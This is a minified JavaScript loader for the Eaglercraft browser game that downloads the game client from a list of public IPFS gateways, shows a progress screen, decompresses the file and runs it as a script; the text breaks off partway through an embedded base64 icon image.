"use strict";!function(){const opts={};var progressPanel=null,progressStr1=null,progressStr2=null,progressStr3=null,progressBarOuter=null,progressBarInner=null,cancelButton=null,currentXHR=null;function makePatternA(domain){const domainStr=domain;return(cid,path)=>"https://"+domainStr+"/ipfs/"+cid+"/"+path}function makePatternB(domain){return(cid,path)=>"https://"+cid+".ipfs."+domain+"/"+path}const IPFS_GATEWAYS=[makePatternA("gateway.ipfs.io"),makePatternB("4everland.io"),makePatternB("dweb.link"),makePatternA("cloudflare-ipfs.com"),makePatternB("cf-ipfs.com"),makePatternA("w3s.link"),makePatternA("ipfs.eth.aragon.network"),makePatternA("storry.tv"),makePatternB("nftstorage.link")];function tryDecompressDownload(arrayBufferIn){return new Promise((resolve=>{var ds=new DecompressionStream("gzip"),result=[];(function fetchStream(reader){return reader.read().then((function processData({done:done,value:value}){if(done){var ret=new Blob(result);return result=[],ret.arrayBuffer()}return result.push(value),reader.read().then(processData)}))})(new Blob([arrayBufferIn]).stream().pipeThrough(ds).getReader()).then((arrayBufferOut=>{resolve(arrayBufferOut)})).catch((err=>{console.error("Could not decompress file!"),console.error(err),resolve(null)}))}))}function tryDownloadURL(ipfsURL){const theIpfsURL=ipfsURL;return new Promise((resolve=>{const xhr=currentXHR=new XMLHttpRequest;cancelButton.disabled=!1,cancelButton.style.display="inline",xhr.open("GET",ipfsURL),xhr.responseType="arraybuffer",xhr.addEventListener("progress",(evt=>{updateProgressBar("Update: "+Math.round(.001*evt.loaded)+" / "+Math.round(.001*opts.dlSize)+" kB",theIpfsURL,Math.min(evt.loaded/opts.dlSize,1))})),xhr.addEventListener("readystatechange",(evt=>{xhr.readyState===XMLHttpRequest.DONE&&(updateProgressBar("Update: "+Math.round(.001*opts.dlSize)+" / "+Math.round(.001*opts.dlSize)+" kB",theIpfsURL,Math.min(evt.loaded/opts.dlSize,1)),null!==cancelButton&&(cancelButton.disabled=!0,currentXHR=null),currentXHR=null,200===xhr.status?resolve(xhr.response):(console.error("Got response code "+xhr.status+" for: "+theIpfsURL),resolve(null)))})),xhr.addEventListener("error",(evt=>{null!==cancelButton&&(cancelButton.disabled=!0),currentXHR=null,console.error("Could not complete request to: "+theIpfsURL),resolve(null)})),xhr.addEventListener("load",(evt=>{null!==cancelButton&&(cancelButton.disabled=!0),currentXHR=null})),xhr.addEventListener("abort",(evt=>{console.error("Request aborted: "+theIpfsURL),null!==cancelButton&&(cancelButton.disabled=!0),currentXHR=null,resolve(null)})),xhr.send()}))}function delayProgress(delayMS){return new Promise((resolve=>{setTimeout((()=>{resolve()}),delayMS)}))}async function tryDownloadClient(ipfsCID,ipfsPath){for(var rand=Math.floor(Math.random()*IPFS_GATEWAYS.length),i=0;i<IPFS_GATEWAYS.length;++i){var url=IPFS_GATEWAYS[(rand+i)%IPFS_GATEWAYS.length](ipfsCID,ipfsPath);updateProgressBar("Update: 0 / "+Math.round(.001*opts.dlSize)+" kB",url,0);try{var j=await tryDownloadURL(url);if(!j)throw"Return value from tryDownloadURL is undefined";if(!opts.gzip)return j;try{if(updateProgressBar("Extracting...",url,-1),j=await tryDecompressDownload(j))return j;throw"Return value from tryDecompressDownload is undefined"}catch(ex){updateProgressBar("Client decompress failed!",url,-1),console.error("Caught exception during decompress: "+url),console.error(ex)}}catch(ex){updateProgressBar("Client download failed!",url,1),console.error("Caught exception during download: "+url),console.error(ex)}await delayProgress(1e3)}return null}function loadClientFile(arrayBuffer){null!=progressPanel&&(progressPanel.remove(),progressPanel=null);var objURL=URL.createObjectURL(new Blob([arrayBuffer],{type:"text/javascript;charset=utf-8"})),scriptElement=document.createElement("script");scriptElement.type="text/javascript",scriptElement.src=objURL,document.head.appendChild(scriptElement)}function updateProgressScreen(str1){progressStr1.innerText=str1}function updateProgressBar(str2,str3,prog){progressStr2.innerText=str2,progressStr3.innerText=str3,prog<0?(progressBarInner.style.width="0%",progressBarOuter.style.border="2px solid transparent"):(progressBarInner.style.width=Math.floor(100*Math.min(prog,1))+"%",progressBarOuter.style.border="2px solid black")}window.addEventListener("load",(async function(){if(window.__eaglercraftLoaderClient){if(opts.container=window.__eaglercraftLoaderClient.container,opts.name=window.__eaglercraftLoaderClient.name,opts.file=window.__eaglercraftLoaderClient.file,opts.cid=window.__eaglercraftLoaderClient.cid,opts.path=window.__eaglercraftLoaderClient.path,opts.dlSize=window.__eaglercraftLoaderClient.dlSize,opts.gzip=window.__eaglercraftLoaderClient.gzip,function initProgressScreen(){if(null==progressPanel){(progressPanel=document.createElement("div")).setAttribute("style","margin:0px;width:100%;height:100%;font-family:sans-serif;display:flex;align-items:center;user-select:none;");var progressPanelInner=document.createElement("div");progressPanelInner.setAttribute("style","margin:auto;text-align:center;");var progressPanelIconContainer=document.createElement("h2"),progressPanelIcon=document.createElement("img");progressPanelIcon.style.imageRendering="pixelated",progressPanelIcon.width=200,progressPanelIcon.height=200,progressPanelIcon.src="data:image/png;base64,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